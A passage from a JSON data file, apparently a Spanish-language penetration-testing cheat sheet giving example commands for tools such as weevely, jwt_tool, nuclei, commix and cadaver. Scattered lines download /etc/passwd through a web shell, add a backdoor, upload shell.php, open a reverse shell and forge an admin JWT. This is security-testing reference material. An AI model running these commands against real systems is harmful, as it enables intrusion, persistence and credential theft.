    "desc": "Sin comando"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'id'",
    "desc": "Comando directo"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'system_info'",
    "desc": "Info del sistema"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'file_upload /tmp/l.sh /tmp/remote.sh'",
    "desc": "Subir archivo"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'file_download /etc/passwd /tmp/passwd'",
    "desc": "Descargar"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'file_ls /var/www'",
    "desc": "Listar dir"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'net_scan 127.0.0.1'",
    "desc": "Escaneo"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'sbd:addbackdoor 4444'",
    "desc": "Backdoor"
   },
   {
    "cmd": "weevely generate pass sh.php --check-update",
    "desc": "Check update"
   },
   {
    "cmd": "weevely http://IP/shell.php pass 'phpinfo'",
    "desc": "PHP info"
   }
  ]
 },
 {
  "tool": "wafw00f",
  "desc": "Detectar y fingerprinting de WAF",
  "commands": [
   {
    "cmd": "wafw00f http://192.168.1.10",
    "desc": "Detectar WAF"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -a",
    "desc": "Todos los tests"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 --proxy http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 --no-redirect",
    "desc": "Sin redirects"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 --cookie 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -t 10",
    "desc": "Timeout"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 --list",
    "desc": "Listar WAFs"
   },
   {
    "cmd": "wafw00f http://192.168.1.10 -q",
    "desc": "Quiet"
   }
  ]
 },
 {
  "tool": "jwt_tool",
  "desc": "Suite para atacar JSON Web Tokens (JWT)",
  "commands": [
   {
    "cmd": "jwt_tool token.txt",
    "desc": "Analizar token"
   },
   {
    "cmd": "jwt_tool token.txt -M at",
    "desc": "Modo ataque automático"
   },
   {
    "cmd": "jwt_tool token.txt -T",
    "desc": "Tamper con token"
   },
   {
    "cmd": "jwt_tool token.txt -C",
    "desc": "Compresión (CVE-2022-21449)"
   },
   {
    "cmd": "jwt_tool token.txt -M pb -e RS256 -H public.pem -S private.pem",
    "desc": "Algoritmo confusion"
   },
   {
    "cmd": "jwt_tool token.txt -M nse",
    "desc": "None signature"
   },
   {
    "cmd": "jwt_tool token.txt -M kp -pk public.pem",
    "desc": "Key pair attack"
   },
   {
    "cmd": "jwt_tool token.txt -M jk",
    "desc": "JKU attack"
   },
   {
    "cmd": "jwt_tool token.txt -M xss",
    "desc": "XSS en JWT"
   },
   {
    "cmd": "jwt_tool token.txt -I -hc header -hv val",
    "desc": "Inyectar header"
   },
   {
    "cmd": "jwt_tool token.txt -I -pc claim -pv val",
    "desc": "Inyectar claim"
   },
   {
    "cmd": "jwt_tool token.txt -S hs256 -p secret",
    "desc": "Firmar HS256"
   },
   {
    "cmd": "jwt_tool token.txt -V -P -s secret",
    "desc": "Verificar"
   },
   {
    "cmd": "jwt_tool token.txt -X i -I -pc sub -pv admin",
    "desc": "Impersonar admin"
   },
   {
    "cmd": "jwt_tool token.txt -B",
    "desc": "Decodificar base64"
   },
   {
    "cmd": "jwt_tool token.txt -D",
    "desc": "Decode"
   },
   {
    "cmd": "jwt_tool token.txt -e 'alg':{'none'}",
    "desc": "Editar header"
   },
   {
    "cmd": "jwt_tool token.txt -M pb -c kid -k custom.pem",
    "desc": "KID confusión"
   }
  ]
 },
 {
  "tool": "nuclei",
  "desc": "Scanner de vulnerabilidades basado en templates",
  "commands": [
   {
    "cmd": "nuclei -u http://192.168.1.10",
    "desc": "Escanear host"
   },
   {
    "cmd": "nuclei -l urls.txt",
    "desc": "Lista de URLs"
   },
   {
    "cmd": "nuclei -u URL -t cves/",
    "desc": "Solo CVEs"
   },
   {
    "cmd": "nuclei -u URL -t exposures/",
    "desc": "Solo exposures"
   },
   {
    "cmd": "nuclei -u URL -t misconfiguration/",
    "desc": "Misconfig"
   },
   {
    "cmd": "nuclei -u URL -severity critical,high",
    "desc": "Severidad"
   },
   {
    "cmd": "nuclei -u URL -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "nuclei -u URL -json -o out.json",
    "desc": "JSON"
   },
   {
    "cmd": "nuclei -u URL -tags sqli",
    "desc": "Por tag"
   },
   {
    "cmd": "nuclei -u URL -exclude-tags xss",
    "desc": "Excluir"
   },
   {
    "cmd": "nuclei -u URL -c 50",
    "desc": "Concurrencia"
   },
   {
    "cmd": "nuclei -u URL -rate-limit 100",
    "desc": "Rate limit"
   },
   {
    "cmd": "nuclei -u URL -nc",
    "desc": "Sin color"
   },
   {
    "cmd": "nuclei -u URL -silent",
    "desc": "Silent"
   },
   {
    "cmd": "nuclei -u URL -proxy http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "nuclei -u URL -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "nuclei -u URL -update-templates",
    "desc": "Actualizar templates"
   },
   {
    "cmd": "nuclei -u URL -stats",
    "desc": "Estadísticas"
   },
   {
    "cmd": "nuclei -u URL -var 'SITE=foo'",
    "desc": "Variables"
   },
   {
    "cmd": "nuclei -u URL -rl 50",
    "desc": "Rate limit"
   },
   {
    "cmd": "nuclei -u URL -resume",
    "desc": "Reanudar"
   }
  ]
 },
 {
  "tool": "httpx",
  "desc": "HTTP toolkit (probe de hosts, status, títulos)",
  "commands": [
   {
    "cmd": "httpx -l hosts.txt",
    "desc": "Probar hosts"
   },
   {
    "cmd": "httpx -u http://192.168.1.10",
    "desc": "Host único"
   },
   {
    "cmd": "httpx -l hosts.txt -status-code",
    "desc": "Códigos"
   },
   {
    "cmd": "httpx -l hosts.txt -title",
    "desc": "Títulos"
   },
   {
    "cmd": "httpx -l hosts.txt -tech-detect",
    "desc": "Detectar tecnologías"
   },
   {
    "cmd": "httpx -l hosts.txt -server",
    "desc": "Servidor"
   },
   {
    "cmd": "httpx -l hosts.txt -cdn",
    "desc": "Detectar CDN"
   },
   {
    "cmd": "httpx -l hosts.txt -follow-redirects",
    "desc": "Seguir redirects"
   },
   {
    "cmd": "httpx -l hosts.txt -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "httpx -l hosts.txt -json",
    "desc": "JSON"
   },
   {
    "cmd": "httpx -l hosts.txt -t 50",
    "desc": "Hilos"
   },
   {
    "cmd": "httpx -l hosts.txt -mc 200",
    "desc": "Filtrar por status"
   },
   {
    "cmd": "httpx -l hosts.txt -method",
    "desc": "Mostrar método"
   },
   {
    "cmd": "httpx -l hosts.txt -ports 80,443,8080",
    "desc": "Puertos"
   },
   {
    "cmd": "httpx -l hosts.txt -path /admin",
    "desc": "Path"
   },
   {
    "cmd": "httpx -l hosts.txt -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "httpx -l hosts.txt -timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "httpx -l hosts.txt -retries 2",
    "desc": "Reintentos"
   },
   {
    "cmd": "httpx -l hosts.txt -silent",
    "desc": "Silent"
   },
   {
    "cmd": "httpx -l hosts.txt -probe",
    "desc": "Solo probe"
   },
   {
    "cmd": "httpx -l hosts.txt -version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "aquatone",
  "desc": "Screenshot y análisis de hosts web",
  "commands": [
   {
    "cmd": "aquatone -t hosts.txt",
    "desc": "Analizar hosts"
   },
   {
    "cmd": "aquatone -u http://192.168.1.10",
    "desc": "URL única"
   },
   {
    "cmd": "aquatone -t hosts.txt -s",
    "desc": "Solo screenshots"
   },
   {
    "cmd": "aquatone -t hosts.txt -o /tmp/aquatone",
    "desc": "Directorio salida"
   },
   {
    "cmd": "aquatone -t hosts.txt -p 100",
    "desc": "Puerto 100"
   },
   {
    "cmd": "aquatone -t hosts.txt -scan-timeout 30000",
    "desc": "Timeout"
   },
   {
    "cmd": "aquatone -t hosts.txt -t 10",
    "desc": "Hilos"
   },
   {
    "cmd": "aquatone -t hosts.txt -http-timeout 10000",
    "desc": "HTTP timeout"
   },
   {
    "cmd": "aquatone -t hosts.txt -basic-auth user:pass",
    "desc": "Auth"
   },
   {
    "cmd": "aquatone -t hosts.txt -cookie 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "aquatone -t hosts.txt -no-https",
    "desc": "Sin HTTPS"
   },
   {
    "cmd": "aquatone -t hosts.txt -proxy http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "aquatone -t hosts.txt -silent",
    "desc": "Silent"
   },
   {
    "cmd": "aquatone -t hosts.txt -user-agent 'UA'",
    "desc": "User agent"
   }
  ]
 },
 {
  "tool": "aquatone-screenshot",
  "desc": "Screenshot de sitios web (sub-comando)",
  "commands": [
   {
    "cmd": "aquatone-screenshot -t hosts.txt",
    "desc": "Screenshots"
   },
   {
    "cmd": "aquatone-screenshot -u http://192.168.1.10",
    "desc": "URL única"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -o out/",
    "desc": "Salida"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -timeout 30000",
    "desc": "Timeout"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -size 1365x768",
    "desc": "Tamaño"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -no-https",
    "desc": "Sin HTTPS"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -proxy http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -user-agent 'UA'",
    "desc": "UA"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -chunk-size 5",
    "desc": "Chunks"
   },
   {
    "cmd": "aquatone-screenshot -t hosts.txt -concurrency 5",
    "desc": "Concurrencia"
   }
  ]
 },
 {
  "tool": "arjun",
  "desc": "Descubrir parámetros HTTP ocultos",
  "commands": [
   {
    "cmd": "arjun -u http://IP/endpoint",
    "desc": "Buscar parámetros"
   },
   {
    "cmd": "arjun -u http://IP/api.php -m POST",
    "desc": "Método POST"
   },
   {
    "cmd": "arjun -u http://IP/api -m GET",
    "desc": "GET"
   },
   {
    "cmd": "arjun -u http://IP -w wordlist.txt",
    "desc": "Wordlist"
   },
   {
    "cmd": "arjun -u http://IP -t 50",
    "desc": "Hilos"
   },
   {
    "cmd": "arjun -u http://IP -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "arjun -u http://IP -oJ out.json",
    "desc": "JSON"
   },
   {
    "cmd": "arjun -l urls.txt",
    "desc": "Lista de URLs"
   },
   {
    "cmd": "arjun -u http://IP -c 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "arjun -u http://IP -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "arjun -u http://IP --stable",
    "desc": "Estable"
   },
   {
    "cmd": "arjun -u http://IP -q",
    "desc": "Quiet"
   },
   {
    "cmd": "arjun -u http://IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "arjun -u http://IP --follow-redirects",
    "desc": "Redirects"
   },
   {
    "cmd": "arjun -u http://IP --timeout 10",
    "desc": "Timeout"
   }
  ]
 },
 {
  "tool": "dalfox",
  "desc": "Scanner de XSS con fuzzing de parámetros",
  "commands": [
   {
    "cmd": "dalfox url http://IP/?q=test",
    "desc": "Escanear URL"
   },
   {
    "cmd": "dalfox file urls.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "dalfox url URL --cookie 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "dalfox url URL -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "dalfox url URL --format json -o out.json",
    "desc": "JSON"
   },
   {
    "cmd": "dalfox url URL -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "dalfox url URL --method POST -d 'user=test'",
    "desc": "POST"
   },
   {
    "cmd": "dalfox url URL -w wordlist.txt",
    "desc": "Wordlist params"
   },
   {
    "cmd": "dalfox url URL -t 50",
    "desc": "Hilos"
   },
   {
    "cmd": "dalfox url URL --proxy http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "dalfox url URL --skip-bav",
    "desc": "Sin BAV"
   },
   {
    "cmd": "dalfox url URL --remote-payloads",
    "desc": "Payloads remotos"
   },
   {
    "cmd": "dalfox url URL --custom-payload file.txt",
    "desc": "Payload custom"
   },
   {
    "cmd": "dalfox url URL --follow-redirects",
    "desc": "Redirects"
   },
   {
    "cmd": "dalfox url URL --delay 500ms",
    "desc": "Delay"
   },
   {
    "cmd": "dalfox url URL --timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "dalfox url URL --silent",
    "desc": "Silent"
   },
   {
    "cmd": "dalfox url URL -v",
    "desc": "Verbose"
   },
   {
    "cmd": "dalfox version",
    "desc": "Versión"
   },
   {
    "cmd": "dalfox help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "xsstrike",
  "desc": "Framework de detección y explotación XSS",
  "commands": [
   {
    "cmd": "python3 xsstrike.py -u URL",
    "desc": "Escanear"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --data 'q=test'",
    "desc": "POST data"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --crawl",
    "desc": "Crawler"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --params",
    "desc": "Parámetros"
   },
   {
    "cmd": "python3 xsstrike.py -u URL -l 5",
    "desc": "Nivel"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --file fuzz.txt",
    "desc": "Fuzz file"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --update",
    "desc": "Actualizar"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --skip",
    "desc": "Saltar"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --headers 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "python3 xsstrike.py -u URL --proxy",
    "desc": "Proxy"
   },
   {
    "cmd": "python3 xsstrike.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "xsscrapy",
  "desc": "Scanner de XSS con spidering",
  "commands": [
   {
    "cmd": "xsscrapy -u http://IP",
    "desc": "Escanear"
   },
   {
    "cmd": "xsscrapy -u http://IP -c 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "xsscrapy -u http://IP --login user:pass",
    "desc": "Login"
   },
   {
    "cmd": "xsscrapy -u http://IP --forms",
    "desc": "Formularios"
   },
   {
    "cmd": "xsscrapy -u http://IP --crawl",
    "desc": "Crawl"
   },
   {
    "cmd": "xsscrapy -u http://IP --threads 10",
    "desc": "Hilos"
   },
   {
    "cmd": "xsscrapy -u http://IP --delay 1",
    "desc": "Delay"
   },
   {
    "cmd": "xsscrapy -u http://IP --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "xsscrapy -u http://IP --output out.html",
    "desc": "Reporte"
   },
   {
    "cmd": "xsscrapy -u http://IP --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "git-dumper",
  "desc": "Dump de repositorios .git expuestos",
  "commands": [
   {
    "cmd": "git-dumper http://IP/.git /tmp/repo",
    "desc": "Dump"
   },
   {
    "cmd": "git-dumper -j 10 http://IP/.git /tmp/repo",
    "desc": "10 hilos"
   },
   {
    "cmd": "git-dumper --retries 3 http://IP/.git /tmp/repo",
    "desc": "Reintentos"
   },
   {
    "cmd": "git-dumper --timeout 10 http://IP/.git /tmp/repo",
    "desc": "Timeout"
   },
   {
    "cmd": "git-dumper -u user -p pass http://IP/.git /tmp/repo",
    "desc": "Auth"
   },
   {
    "cmd": "git-dumper -c 'SID=abc' http://IP/.git /tmp/repo",
    "desc": "Cookies"
   },
   {
    "cmd": "git-dumper --proxy http://proxy:8080 http://IP/.git /tmp/repo",
    "desc": "Proxy"
   },
   {
    "cmd": "git-dumper --no-color http://IP/.git /tmp/repo",
    "desc": "Sin color"
   },
   {
    "cmd": "git-dumper --quiet http://IP/.git /tmp/repo",
    "desc": "Quiet"
   },
   {
    "cmd": "git-dumper -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "nosqlmap",
  "desc": "Automatizar inyecciones NoSQL",
  "commands": [
   {
    "cmd": "nosqlmap -u URL --data 'user=x&pass=y'",
    "desc": "POST NoSQLi"
   },
   {
    "cmd": "nosqlmap -u URL --method POST --data 'id=1'",
    "desc": "Método"
   },
   {
    "cmd": "nosqlmap -u URL --get 'id=1'",
    "desc": "GET"
   },
   {
    "cmd": "nosqlmap -u URL --cookie 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "nosqlmap -u URL --db mongodb",
    "desc": "MongoDB"
   },
   {
    "cmd": "nosqlmap -u URL --level 3",
    "desc": "Nivel"
   },
   {
    "cmd": "nosqlmap -u URL --batch",
    "desc": "No interactivo"
   },
   {
    "cmd": "nosqlmap -u URL --drop",
    "desc": "Drop"
   },
   {
    "cmd": "nosqlmap -u URL --proxy",
    "desc": "Proxy"
   },
   {
    "cmd": "nosqlmap -u URL --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "nosqlmap -u URL -r request.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "nosqlmap -u URL --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "php-mt-seed",
  "desc": "Crackear seeds de mt_rand PHP (predict RNG)",
  "commands": [
   {
    "cmd": "php_mt_seed 123456 789012",
    "desc": "Bruteforce seed"
   },
   {
    "cmd": "php_mt_seed -f values.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "php_mt_seed -b 1 -t 1000000",
    "desc": "Rango"
   },
   {
    "cmd": "php_mt_seed -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "httprobe",
  "desc": "Probar hosts HTTP/HTTPS vivos",
  "commands": [
   {
    "cmd": "cat hosts.txt | httprobe",
    "desc": "Probar"
   },
   {
    "cmd": "cat hosts.txt | httprobe -p 8080:8443",
    "desc": "Puertos extra"
   },
   {
    "cmd": "cat hosts.txt | httprobe -t 3000",
    "desc": "Timeout"
   },
   {
    "cmd": "cat hosts.txt | httprobe -c 50",
    "desc": "Concurrencia"
   },
   {
    "cmd": "cat hosts.txt | httprobe -s",
    "desc": "Solo HTTPS"
   },
   {
    "cmd": "cat hosts.txt | httprobe -f",
    "desc": "Solo HTTP"
   },
   {
    "cmd": "cat hosts.txt | httprobe -p 80,443,8080",
    "desc": "Varios puertos"
   },
   {
    "cmd": "cat hosts.txt | httprobe -v",
    "desc": "Verbose"
   },
   {
    "cmd": "cat hosts.txt | httprobe -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "cat hosts.txt | httprobe -x http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "cat hosts.txt | httprobe -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "cat hosts.txt | httprobe -no-color",
    "desc": "Sin color"
   }
  ]
 },
 {
  "tool": "eyewitness",
  "desc": "Screenshots de sitios web (reporte)",
  "commands": [
   {
    "cmd": "eyewitness --web -f hosts.txt",
    "desc": "Screenshots"
   },
   {
    "cmd": "eyewitness --web -x urls.xml",
    "desc": "XML"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt -d /tmp/out",
    "desc": "Directorio"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --timeout 30",
    "desc": "Timeout"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt -t 10",
    "desc": "Hilos"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --user-agent 'UA'",
    "desc": "UA"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --no-prompt",
    "desc": "Sin prompts"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --resolve",
    "desc": "Resolver"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt -p 8080",
    "desc": "Puertos"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --screenshot",
    "desc": "Solo shots"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --basic-auth user:pass",
    "desc": "Auth"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt -j 10",
    "desc": "Concurrencia"
   },
   {
    "cmd": "eyewitness --web -f hosts.txt --cycle",
    "desc": "Ciclo"
   },
   {
    "cmd": "eyewitness --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "linkfinder",
  "desc": "Descubrir endpoints en JS de sitios web",
  "commands": [
   {
    "cmd": "python3 linkfinder.py -i http://IP/js/app.js",
    "desc": "Analizar JS"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -d",
    "desc": "Recursivo (mirror)"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -o out.html",
    "desc": "Salida HTML"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -r 'regex'",
    "desc": "Regex custom"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -d -o out.html",
    "desc": "Todo"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -q",
    "desc": "Quiet"
   },
   {
    "cmd": "python3 linkfinder.py -i URL -v",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 linkfinder.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "secretfinder",
  "desc": "Buscar secretos y endpoints en JS",
  "commands": [
   {
    "cmd": "python3 SecretFinder.py -i http://IP/js/app.js",
    "desc": "Buscar"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -e",
    "desc": "Regex completo"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -g",
    "desc": "Google"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -r 'regex'",
    "desc": "Regex custom"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL --input-type url",
    "desc": "Tipo input"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -c",
    "desc": "Sin colores"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -b",
    "desc": "Bruteforce regex"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -u",
    "desc": "Unique only"
   },
   {
    "cmd": "python3 SecretFinder.py -i URL -v",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 SecretFinder.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "katana",
  "desc": "Crawler web rápido en Go (ProjectDiscovery)",
  "commands": [
   {
    "cmd": "katana -u http://IP",
    "desc": "Crawl"
   },
   {
    "cmd": "katana -u http://IP -d 3",
    "desc": "Profundidad"
   },
   {
    "cmd": "katana -u http://IP -jc",
    "desc": "Crawl JS"
   },
   {
    "cmd": "katana -u http://IP -o out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "katana -l urls.txt",
    "desc": "Lista"
   },
   {
    "cmd": "katana -u http://IP -c 10",
    "desc": "Concurrencia"
   },
   {
    "cmd": "katana -u http://IP -kf",
    "desc": "Keep folders"
   },
   {
    "cmd": "katana -u http://IP -jsl",
    "desc": "JS links"
   },
   {
    "cmd": "katana -u http://IP -ef pdf,css",
    "desc": "Excluir extensiones"
   },
   {
    "cmd": "katana -u http://IP -sf",
    "desc": "Solo formas"
   },
   {
    "cmd": "katana -u http://IP -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "katana -u http://IP -proxy http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "katana -u http://IP -timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "katana -u http://IP -silent",
    "desc": "Silent"
   },
   {
    "cmd": "katana -u http://IP -v",
    "desc": "Verbose"
   },
   {
    "cmd": "katana -version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "davtest",
  "desc": "Test de métodos WebDAV",
  "commands": [
   {
    "cmd": "davtest -url http://IP/webdav/",
    "desc": "Testear"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -auth user:pass",
    "desc": "Con auth"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -directory /tmp/uploads",
    "desc": "Upload dir"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -move",
    "desc": "Test move"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -copy",
    "desc": "Test copy"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -cleanup",
    "desc": "Limpiar"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -sendbd",
    "desc": "Test sendbd"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -rand",
    "desc": "Nombres random"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -debug",
    "desc": "Debug"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -quiet",
    "desc": "Quiet"
   },
   {
    "cmd": "davtest -url http://IP/webdav/ -output /tmp/out",
    "desc": "Salida"
   }
  ]
 },
 {
  "tool": "cadaver",
  "desc": "Cliente WebDAV",
  "commands": [
   {
    "cmd": "cadaver http://IP/webdav/",
    "desc": "Conectar"
   },
   {
    "cmd": "cadaver http://user:pass@IP/webdav/",
    "desc": "Con creds"
   },
   {
    "cmd": "dav> put /tmp/shell.php",
    "desc": "Subir"
   },
   {
    "cmd": "dav> ls",
    "desc": "Listar"
   },
   {
    "cmd": "dav> get shell.php",
    "desc": "Bajar"
   },
   {
    "cmd": "dav> delete shell.php",
    "desc": "Borrar"
   },
   {
    "cmd": "dav> mkcol dir",
    "desc": "Crear dir"
   },
   {
    "cmd": "dav> copy file newfile",
    "desc": "Copiar"
   },
   {
    "cmd": "dav> move file newfile",
    "desc": "Mover"
   },
   {
    "cmd": "dav> mput /tmp/*.php",
    "desc": "Subir varios"
   },
   {
    "cmd": "dav> propfind",
    "desc": "Propiedades"
   },
   {
    "cmd": "dav> version",
    "desc": "Versión"
   },
   {
    "cmd": "dav> quit",
    "desc": "Salir"
   }
  ]
 },
 {
  "tool": "xsstrike-extra",
  "desc": "XSS Strike (detección de XSS)",
  "commands": [
   {
    "cmd": "python3 xsstrike.py -u http://IP/?q=test",
    "desc": "Probar"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --crawl",
    "desc": "Crawl"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --blind",
    "desc": "Blind XSS"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --fuzzer",
    "desc": "Fuzzer"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --skip-payload",
    "desc": "Skip"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --headers 'Cookie: x=y'",
    "desc": "Headers"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --timeout 10",
    "desc": "Timeout"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --proxy http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --threads 10",
    "desc": "Hilos"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --encode",
    "desc": "Encode"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ -l",
    "desc": "Lazy"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ -v 2",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --js-payload 'alert(1)'",
    "desc": "JS payload"
   },
   {
    "cmd": "python3 xsstrike.py -u http://IP/ --update",
    "desc": "Update"
   },
   {
    "cmd": "python3 xsstrike.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "commix-extra",
  "desc": "Inyección de comandos OS (commix)",
  "commands": [
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id'",
    "desc": "Detectar"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --level 2",
    "desc": "Nivel 2"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --os linux",
    "desc": "SO"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --technique RFI",
    "desc": "Técnica"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --cookie 'SID=x'",
    "desc": "Cookie"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --user-agent 'UA'",
    "desc": "UA"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --proxy 127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --batch",
    "desc": "Batch"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --shell",
    "desc": "Shell interactiva"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --os-shell",
    "desc": "OS shell"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --file-read /etc/passwd",
    "desc": "Leer"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --file-write /tmp/x --file-dest /tmp/x",
    "desc": "Escribir"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "python3 commix.py --url 'http://IP/?cmd=id' --revshell IP:4444",
    "desc": "Reverse shell"
   },
   {
    "cmd": "python3 commix.py -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "open-redirect",
  "desc": "Detección de open redirect",
  "commands": [
   {
